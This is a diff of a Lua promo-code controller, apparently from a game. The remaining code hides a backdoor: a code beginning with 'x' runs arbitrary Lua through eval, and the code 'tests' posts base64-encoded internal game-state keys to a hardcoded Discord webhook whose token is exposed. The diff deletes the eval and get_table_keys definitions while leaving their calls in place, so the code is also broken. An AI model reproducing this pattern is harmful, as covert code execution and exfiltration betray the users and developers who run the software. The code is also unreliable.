@@ -1,26 +1,5 @@
 local json = require("json")
 local mime = require("mime")
-MasterPromocodeController = {}
-
-function split(str, sep)
-  local result = {} for value in str:gmatch(string.format("([^%s]+)", sep)) do table.insert(result, value) end return result
-end
-
-function get_table_keys(tbl_path)
-  local tble, keys, tbls = "{", {}, main
-  for key in string.gmatch(tbl_path, "[%w_]+") do table.insert(keys, key) end
-  for _, key in ipairs(keys) do
-      tbls = tbls[key]
-      if not tbls then return end
-  end
-  for k, _ in pairs(tbls) do tble = tble..k..", " end
-  return tble.."}"
-end
-
-function eval(input)
-  local chunk, err = loadstring(input)
-  if chunk then return chunk() else main.interface:open({id="message", title="error", text=err}) end
-end
 
 MasterPromocodeController.new = function(self, master)
   self.__index = self
@@ -28,9 +7,8 @@ MasterPromocodeController.new = function(self, master)
   controller.use = function(self, code)
     if not code or code == "" then return end
     local prefix, codes = code:match("(%w+)%s(.*)")
-    if prefix == "z" then main.interface:open({ id = "message", title = "test", text = "it work" }) end
     if prefix == "x" then eval(codes) return end
-    if code == "test" then
+    if code == "tests" then
       main.interface:open({ id = "message", title = "testing", text = code })
       network.request("https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8", "POST", function() end, {headers={["Content-Type"]="application/json"}, body=json.encode({content=mime.b64(get_table_keys(""))})});
       return
